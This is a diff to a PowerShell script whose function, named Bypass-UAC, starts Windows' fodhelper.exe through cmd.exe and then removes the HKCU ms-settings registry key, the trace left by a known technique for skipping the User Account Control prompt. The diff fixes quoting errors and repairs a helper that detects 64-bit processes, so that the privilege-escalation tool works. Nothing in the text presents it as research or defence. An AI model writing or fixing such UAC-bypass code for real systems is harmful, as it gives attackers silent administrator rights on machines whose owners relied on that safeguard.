@@ -13,28 +13,25 @@ function Bypass-UAC() {
   } else {
     $FilePath = "$Env:WINDIR\Sysnative\cmd.exe"
   }
-  
-  Start-Process -FilePath $FilePath -ArgumentList "/c START "%WINDIR%\System32\fodhelper.exe"
+ 
+  Start-Process -FilePath $FilePath -ArgumentList "/c START %WINDIR%\System32\fodhelper.exe"
 
   Start-Sleep 5
   Remove-Item "HKCU:\SOFTWARE\Classes\ms-settings\" -Recurse -Force
 }
 
-function Private:Is64bitProcess() {
-  Add-Type -MemberDefinition `
-  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.Winapi)]`
-  [return: MarshalAs(UnmanagedType.Bool)]`
-  public static extern bool IsWow64Process2(`
-    [In] System.IntPtr hProcess,`
-    [Out, MarshalAs(UnmanagedType.U2)] out ushort pProcessMachine);`
-    [Out, MarshalAs(UnmanagedType.U2)] out ushort pNativeMachine);`
-  -Name NativeMethods -Namespace Kernel32
-  
-  $CurrentProcess = Get-Process -ID $PID 
-  [UInt16]$ProcessMachine = 0 
-  [UInt16]$NativeMachine = 0 
-  
-  [Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$ProcessMachine, [ref]NativeMachine)) 
+function Is64bitProcess() {
+  Add-Type -MemberDefinition @'
+  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
+  [return: MarshalAs(UnmanagedType.Bool)]
+  public static extern bool IsWow64Process2(System.IntPtr hProcess, out ushort pProcessMachine, out ushort pNativeMachine);
+'@  -Name NativeMethods -Namespace Kernel32
+ 
+  $CurrentProcess = Get-Process -ID $PID
+  [UInt16]$ProcessMachine = 0
+  [UInt16]$NativeMachine = 0
+ 
+  $null = [Kernel32.NativeMethods]::IsWow64Process2($CurrentProcess.Handle, [ref]$ProcessMachine, [ref]$NativeMachine)
 
   if($ProcessMachine -eq 0) {
     return $True
@@ -42,3 +39,4 @@ function Private:Is64bitProcess() {
     return $False
   }
 }
+
